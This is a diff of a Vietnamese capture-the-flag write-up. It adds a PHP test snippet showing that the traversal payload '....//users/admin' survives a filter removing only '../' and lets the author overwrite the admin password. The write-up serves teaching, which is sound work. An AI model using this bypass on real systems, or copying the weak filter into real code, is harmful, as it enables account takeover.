@@ -255,9 +255,53 @@ Trông có vẻ tức mắt vì nhiều for với if quá, nhưng nếu bạn ch
 Trong khi đọc hiểu và phân tích tính năng thì mình thấy trong source có mấy comment `\~(*o*)~/`, `^_^` ở các phần check đường dẫn rất là ẩn ý. Mà cũng dễ thấy phần đầu tiên lọc bỏ `../` và `..\\`, nhưng phần dưới lại chống không cho dùng relative path để ra khỏi /users, chứng tỏ bài này có cách bypass qua đoạn check kia.
 
 Từ đó mình nghĩ ra cách làm bài này là làm sao dùng tính năng đăng ký và path traversal để ghi đè password của mình lên password của admin. Sau đó đăng nhập vào lấy flag.
-Nghĩ tí là ra ngay payload `....//users/admin` thôi. Các bạn xem đoạn test này của mình cho dễ hiểu
+Nghĩ tí là ra ngay payload `....//users/admin` thôi. Các bạn xem đoạn code test này của mình cho dễ hiểu
 
 ![][test-code]
+
+<details>
+  <summary>Source code</summary> 
+  
+  ```php
+  <?php
+  function get_absolute_path($path)
+  {
+      $unix = substr($path, 0, 1) === '/';
+
+      $path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
+      $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen');
+      $absolutes = array();
+      foreach ($parts as $part) {
+          if ('.' == $part) continue;
+          if ('..' == $part) {
+              array_pop($absolutes);
+          } else {
+              $absolutes[] = $part;
+          }
+      }
+
+      $final_path = implode(DIRECTORY_SEPARATOR, $absolutes);
+      if ($unix) {
+          $final_path = '/' . $final_path;
+      }
+
+      return $final_path;
+  }
+  
+  $username = 'test';
+
+  $user_dir = get_absolute_path(getcwd() . '/users/' . $username);
+
+  echo get_absolute_path($user_dir) . PHP_EOL;
+
+  $username = '....//users/admin';
+  $username = str_replace(array('../', '..\\'), '', $username);
+
+  $user_dir = get_absolute_path(getcwd() . '/users/' . $username);
+
+  echo get_absolute_path($user_dir);
+  ```
+</details>
 
 Flag:
 ```
